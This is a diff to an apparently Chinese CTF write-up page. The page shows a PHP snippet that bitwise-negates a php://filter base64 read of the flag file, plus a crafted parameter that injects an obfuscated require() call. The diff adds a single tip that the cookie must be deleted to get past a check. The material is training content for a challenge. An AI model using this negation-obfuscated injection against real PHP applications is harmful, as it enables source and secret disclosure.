@@ -246,6 +246,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$s = &#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;;</span><br><span class="line">echo urlencode(~$s);</span><br></pre></td></tr></table></figure>
 <p>然后构造</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//</span><br></pre></td></tr></table></figure>
+<p>对于这题注意的点是要将cookie删掉，否则绕不过第三个if</p>
 <p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/111824177]">https://blog.csdn.net/rfrder/article/details/111824177]</a></p>
 <pre><code>[https://www.gem-love.com/ctf/770.html]
 
